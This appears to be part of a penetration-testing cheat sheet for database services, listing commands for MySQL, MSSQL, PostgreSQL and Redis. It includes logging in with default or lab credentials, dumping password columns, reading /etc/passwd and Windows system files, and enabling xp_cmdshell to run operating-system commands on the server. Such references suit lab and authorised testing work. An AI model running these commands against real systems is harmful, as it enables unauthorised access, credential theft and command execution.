## Databases

### MySQL — 3306

```bash
# Connect to MySQL with the root password.
mysql -u root -p'root' -h "$IP" -P 3306 --skip-ssl-verify-server-cert
```

```sql
-- List databases.
SHOW DATABASES;
-- Select the application database.
USE app;
-- List its tables.
SHOW TABLES;
-- Read usernames and password values.
SELECT user,password FROM users;
-- Read a local server file.
SELECT LOAD_FILE('/etc/passwd');
-- Show the permitted file directory.
SHOW VARIABLES LIKE 'secure_file_priv';
```

### MSSQL — 1433

```bash
# Connect to MSSQL with Windows authentication.
impacket-mssqlclient "Administrator:Lab123@$IP" -windows-auth
```

```sql
-- List MSSQL databases.
SELECT name FROM master.dbo.sysdatabases;
-- Enable advanced configuration options.
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
-- Enable operating-system command execution.
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
-- Run whoami on the database server.
EXECUTE xp_cmdshell 'whoami';
-- Read the Windows hosts file.
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts',SINGLE_CLOB) AS Contents;
```

### PostgreSQL — 5432

```bash
# Connect to the default PostgreSQL database.
psql -h "$IP" -U postgres -d postgres
```

```sql
-- List databases.
\l
-- List tables.
\dt
-- Show the active user and server version.
SELECT current_user,version();
```

### Redis — 6379

```bash
# Read Redis server information.
redis-cli -h "$IP" INFO | tee redis.txt
# Read the Redis configuration.
redis-cli -h "$IP" CONFIG GET '*'
# List Redis keys.
redis-cli -h "$IP" --scan | tee redis-keys.txt
```
